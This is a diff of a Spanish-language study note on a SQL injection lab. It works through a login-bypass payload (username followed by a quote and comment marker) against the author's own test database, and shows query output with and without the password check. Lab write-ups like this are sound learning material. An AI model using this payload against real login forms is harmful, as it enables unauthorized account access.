@@ -31,16 +31,45 @@ select id,username,subscription from users where username = 'administrator'--' a
 
 ### Explicación con Lab:
 
-1. Hago exactamente el mismo queary pero adaptado con un `username` de mi base de datos.
-- Esto arroja un solo resultado, como está planeado originalmente:
+1. Hago exactamente que el ejemplo original, pero adaptado con un `username` de mi base de datos.
+- Ojo!!! Como no tengo el **password** y solo el tengo el **username**, me marcará un resultado vacío:
+
+````sql
+select id,username,subscription from users where username = 'F0n3' and password = 'no_tengo_idea_del_password_:P';
+````
+````py
+Empty set (0.000 sec) # <<<---|| Resultado vacío!!!
+````
+
+2. Si utilizo el **password** correspondiente me debería regresar un resultado, como se planeó originalmente: 
 
 ````sql
 select id,username,subscription from users where username = 'F0n3' and password = 'p@ssw0rd123-1';
 ````
+````py
++----+----------+--------------+
+| id | username | subscription |
++----+----------+--------------+
+|  2 | F0n3     | 1            |
++----+----------+--------------+
+````
 
-2. Si agrego el payload `F0n3' --` ya no importa 
+3. Si agrego el payload `F0n3' --` ya no importa el query para validar el password, ya que arrojará todo lo que sea igual a `F0n3`... sin importar el **password**!!! Muahaha!!!
 
+````sql
+# Version Web
+select id,username,subscription from users where username = 'F0n3' --' and password = 'Ya_no_importa_nada_que_escriba_aquí_lol!';
 
+# Consola SQL
+select id,username,subscription from users where username = 'F0n3'; --'; and password = 'Ya_no_importa_nada_que_escriba_aquí_lol!';
+````
+````py
++----+----------+--------------+
+| id | username | subscription |
++----+----------+--------------+
+|  2 | F0n3     | 1            |
++----+----------+--------------+
+````
 
 ## Solución:
 
